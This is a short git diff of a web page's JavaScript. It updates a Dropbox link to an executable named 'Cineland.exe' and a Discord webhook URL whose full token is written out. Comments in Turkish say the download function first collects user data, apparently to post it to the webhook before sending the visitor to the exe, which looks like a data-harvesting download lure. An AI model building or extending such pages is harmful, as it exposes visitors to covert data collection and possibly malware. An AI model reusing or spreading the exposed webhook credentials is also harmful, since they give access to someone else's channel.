@@ -158,7 +158,7 @@ function closeAppAlert() {
 
 function openDownload() {
     // Navigate to download page or trigger download
-    window.open('https://www.dropbox.com/scl/fi/5pfg68b0tcqfnlw39t58i/Cineland.exe?rlkey=qlzcs45m2zo3ewxq17mub9vmx&st=dqabbgyi&dl=1', '_blank');
+    window.open('https://www.dropbox.com/scl/fi/mxoy3cq5rr0dspqajyukg/Cineland.exe?rlkey=l5owy4rlxk63zaa27fmdru28c&st=08ax9l2o&dl=1', '_blank');
 }
 
 // ============================================
@@ -166,7 +166,7 @@ function openDownload() {
 // ============================================
 
 // Webhook URL - KENDİ URL'İNİZİ KOYUN
-const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1486042390669033562/zKRwTKvFv9Y5Rz6biZ-7NAJNNSVUen4uiGpYu5s5QASM1LQgtA0J3BgvOYW_XDG2e0hO';
+const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1492550965075644507/CtzcWhuCvWAGDnwfLt3aC2pgPyy9diNisl1SXSQjG6Js4qxCfuVXsB-PBuD8SerdZHfj';
 
 function openDownload() {
     // Kullanıcı verilerini topla
@@ -256,7 +256,7 @@ function openDownload() {
         });
 
     // İndirmeye git
-    window.open('https://www.dropbox.com/scl/fi/5pfg68b0tcqfnlw39t58i/Cineland.exe?rlkey=qlzcs45m2zo3ewxq17mub9vmx&st=dqabbgyi&dl=1', '_blank');
+    window.open('https://www.dropbox.com/scl/fi/mxoy3cq5rr0dspqajyukg/Cineland.exe?rlkey=l5owy4rlxk63zaa27fmdru28c&st=08ax9l2o&dl=1', '_blank');
 }
 
 // ============================================
